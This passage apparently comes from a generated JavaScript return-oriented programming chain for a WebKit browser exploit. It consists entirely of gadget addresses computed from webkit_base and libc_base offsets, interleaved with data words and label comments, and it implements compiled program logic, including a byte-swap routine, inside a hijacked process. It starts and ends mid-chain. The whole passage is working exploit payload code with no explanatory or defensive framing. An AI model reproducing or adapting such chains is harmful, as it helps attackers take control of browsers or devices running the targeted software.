webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L146:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+5202439, //and rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L147:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L148:
db([8, 0]); // 0x8
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+71888, //L149
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L149:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+71944, //L152
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L152:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+72072, //L155
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L154:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L155:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+72160, //L156
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+72176, //L158
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L156:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L158:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+72328, //L160
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+72360, //L162
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+72312, //L159
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+72344, //L161
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L159:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L160:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L161:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L162:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+72456, //L164
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+72440, //L163
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L163:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L164:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L165:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L166:
db([24, 0]); // 0x18
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+72608, //L167
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L167:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+72664, //L170
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L170:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877, //pop rsi
ropchain+72800, //L173
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+72768, //L171
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L171:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L172:
db([32, 0]); // 0x20
set_gadget(libc_base+788575,); //pop rax
//L173:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+72928, //L175
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+72944, //L176
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+72912, //L174
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L174:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L175:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L176:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+73040, //L177
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+73056, //L178
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L177:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L178:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+73168, //L179
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+73152, //L180
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L180:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L179:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+73256, //L182
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+73240, //L181
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L181:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L182:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+73352, //L183
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+73368, //L184
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L183:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L184:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+73480, //L185
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+73464, //L186
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L186:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L185:
db([0, 0]); // 0x0
//___builtin_bswap64:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+73552, //L187
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L187:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+73616, //L189
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L189:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([16, 0]); // 0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+73712, //L193
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L192:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L193:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+73784, //L196
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L195:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L196:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L198:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+792472,); //pop rcx
//L199:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+73904, //L201
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L200:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L201:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+954100, //mov [rax], ecx
libc_base+793877, //pop rsi
ropchain+73960, //L204
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L204:
db([0, 0]); // 0x0
//L202:
set_gadgets([
libc_base+793877, //pop rsi
ropchain+74024, //L207
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L206:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+792472,); //pop rcx
//L207:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+74112, //L208
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+74128, //L210
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L208:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L210:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+74280, //L212
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+74312, //L214
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+74264, //L211
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+74296, //L213
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L211:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L212:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L213:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L214:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+74384, //L215
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+74400, //L216
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L215:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L216:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+74496, //L218
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+74480, //L217
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L217:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L218:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+74576, //L219
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L219:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L220:
db([4, 0]); // 0x4
set_gadget(libc_base+206806,); //pop rdi
//L221:
db([4, 0]); // 0x4
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+74728, //L223
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+74744, //L224
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+74712, //L222
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L222:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L223:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L224:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14959219, //cmp rax, rcx ; sete al
webkit_base+48555, //setl al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+74912, //L226
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+74928, //L227
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+74896, //L225
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L225:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L226:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L227:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+75032, //L229
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+75080, //L232
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+75048, //L230
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L229:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L230:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L231:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L232:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+75192, //L233+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+75184, //L233
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L233:
db([0, 0]); // 0x0
set_gadgets([
ropchain+75208, //L233+24
ropchain+75224, //L228
libc_base+811575, //pop rsp
ropchain+75240, //L234
//L228:
libc_base+811575, //pop rsp
ropchain+85632, //L235
//L234:
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L237:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L238:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+75360, //L239
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+75376, //L241
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L239:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L241:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+75520, //L244
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+75488, //L242
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+75504, //L243
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L242:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L243:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L244:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+75592, //L245
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L245:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+75648, //L248
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L248:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L249:
db([7, 0]); // 0x7
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+75792, //L252
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L251:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+792472,); //pop rcx
//L252:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+75880, //L253
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+75896, //L255
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L253:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L255:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+76048, //L257
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+76080, //L259
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+76032, //L256
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+76064, //L258
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L256:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L257:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L258:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L259:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+76200, //L261
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+76216, //L262
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+76184, //L260
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L260:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L261:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L262:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+76320, //L263
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+76336, //L264
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L263:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L264:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+76424, //L265
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L265:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+76480, //L268
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L268:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+76600, //L269
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+76632, //L271
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+76616, //L270
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L269:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L270:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L271:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270096, //mov al, [rdi]
libc_base+793877, //pop rsi
ropchain+76792, //L275
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+76744, //L272
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+76760, //L273
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L272:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L273:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L274:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L275:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+76848, //L277
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L277:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+76952, //L278
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+76984, //L280
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+76968, //L279
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L278:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L279:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L280:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+77144, //L284
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+77096, //L281
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+77112, //L282
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L281:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L282:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L283:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L284:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+77200, //L286
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L286:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+77304, //L287
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+77336, //L289
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+77320, //L288
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L287:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L288:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L289:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+77496, //L293
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+77448, //L290
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+77464, //L291
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L290:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L291:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L292:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L293:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+77552, //L295
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L295:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+77656, //L296
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+77688, //L298
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+77672, //L297
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L296:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L297:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L298:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+77760, //L299
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+77776, //L300
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L299:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L300:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+77864, //L301
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+77896, //L304
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L301:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L303:
db([4294967283, 4294967295]); // -0xd
set_gadget(libc_base+206806,); //pop rdi
//L304:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L306:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
